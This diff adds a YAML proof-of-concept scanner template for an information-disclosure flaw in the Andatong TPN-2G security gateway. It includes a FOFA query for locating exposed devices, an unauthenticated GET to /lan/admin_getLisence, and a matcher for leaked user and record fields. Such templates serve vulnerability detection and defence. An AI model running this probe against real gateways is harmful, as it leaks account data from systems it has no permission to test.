@@ -1,0 +1,16 @@
+id: poc-yaml-adt-tpn-2g-security-gateway-admin-getlisence-info-leak
+info:
+  name: 安达通TPN-2G安全网关 admin_getLisence 信息泄露漏洞
+  severity: medium
+  tags:
+  - 信息泄露
+  finger: TPN-2G安全网关
+  fofa: title="TPN-2G" || title="SJW74"
+requests:
+- method: GET
+  path: /lan/admin_getLisence
+  expression: "status_code == 200 && \ncontains(body,\"\\\"attr_name\\\"\") &&\ncontains(body,\"\
+    \\\"beginrecord\\\"\") &&\ncontains(body,\"\\\"user\\\"\") &&\n!contains(body,\"\
+    <\")\n"
+variables: {}
+transport: http
